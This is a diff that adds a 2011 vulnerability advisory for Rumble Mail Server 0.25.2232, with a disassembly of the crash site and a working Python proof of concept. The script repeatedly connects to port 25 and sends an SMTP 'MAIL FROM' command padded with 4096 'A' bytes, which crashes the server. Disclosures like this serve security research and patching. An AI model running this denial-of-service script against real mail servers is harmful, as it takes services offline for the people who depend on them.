@@ -1,0 +1,67 @@
+# ------------------------------------------------------------------------
+# Software................Rumble 0.25.2232
+# Vulnerability...........Denial Of Service
+# Threat Level............Serious (3/5)
+# Download................http://humbedooh.users.sourceforge.net/
+# Discovery Date..........3/27/2011
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# Email...................John Leitch <john@autosectools.com>
+# ------------------------------------------------------------------------
+# 
+# 
+# --Description--
+# 
+# A denial of service vulnerability can be exploited to crash Rumble
+# Mail Server v0.25.2231.
+# 
+# rumble_win32.exe: The instruction at 0x96CEEB referenced memory at
+# 0x41414149. The memory could not be read (0x0096CEEB -> 41414149)
+# 
+# Disassembly:
+# 
+# .text:0096CEEB mov     edx, [ecx+8]
+# .text:0096CEEE mov     [ebp-8], edx
+# .text:0096CEF1 mov     eax, [ebp-8]
+# .text:0096CEF4 mov     ecx, [eax]
+# .text:0096CEF6 mov     [ebp-0Ch], ecx
+# .text:0096CEF9 mov     edx, [ebp+0Ch]
+# .text:0096CEFC mov     [ebp-10h], edx
+# .text:0096CEFF
+# .text:0096CEFF loc_96CEFF:                             ; CODE XREF: .text:0096CF31
+# .text:0096CEFF mov     eax, [ebp-10h]
+# .text:0096CF02 mov     cl, [eax]
+# .text:0096CF04 mov     [ebp-11h], cl
+# .text:0096CF07 mov     edx, [ebp-0Ch]
+# .text:0096CF0A cmp     cl, [edx]
+# .text:0096CF0C jnz     short loc_96CF3C
+# 
+# 
+# --PoC--
+
+import socket
+
+host = 'localhost'
+tld = 'mydomain.tld'
+port = 25
+
+def crash():    
+ for i in range(0, 16):
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((host, port))
+  s.settimeout(32)    
+  
+  junk = 'A' * 4096
+  
+  print s.recv(8192)
+  s.send('HELO ' + tld + '\r\n')
+  print s.recv(8192)
+  s.send('MAIL FROM ' + junk + '\r\n') 
+  print s.recv(8192)
+  
+  s.close()
+ 
+
+crash()
